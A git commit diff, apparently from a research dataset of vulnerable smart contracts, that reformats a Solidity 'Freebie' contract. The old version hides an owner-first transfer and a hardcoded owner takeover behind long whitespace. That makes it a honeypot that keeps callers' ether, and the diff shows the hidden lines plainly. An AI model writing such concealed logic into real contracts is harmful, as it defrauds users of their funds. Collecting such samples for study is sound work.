9e9fda7b5df98de56161d6387f7b59f2f4f21f2e
Konstantinos Triantafyllou <ko.trian@gmail.com>
2021-01-06 10:45:45 +0000

    Format source code of a few contracts

--- vulnerable-sources/unchecked_low_level_calls_0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol
+++ vulnerable-sources/unchecked_low_level_calls_0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol
@@ -10,14 +10,20 @@ contract Freebie
 {
     address public Owner = msg.sender;
    
-    function() public payable{}
+    function()
+    public
+    payable
+    {
+
+    }
    
     function GetFreebie()
     public
     payable
     {                                                                    
         if(msg.value>1 ether)
-        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
+        {
+            Owner.transfer(this.balance);
             msg.sender.transfer(this.balance);
         }                                                                                                                
     }
@@ -25,7 +31,11 @@ contract Freebie
     function withdraw()
     payable
     public
-    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
+    {
+        if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595)
+        {
+            Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;
+        }
         require(msg.sender == Owner);
         Owner.transfer(this.balance);
     }
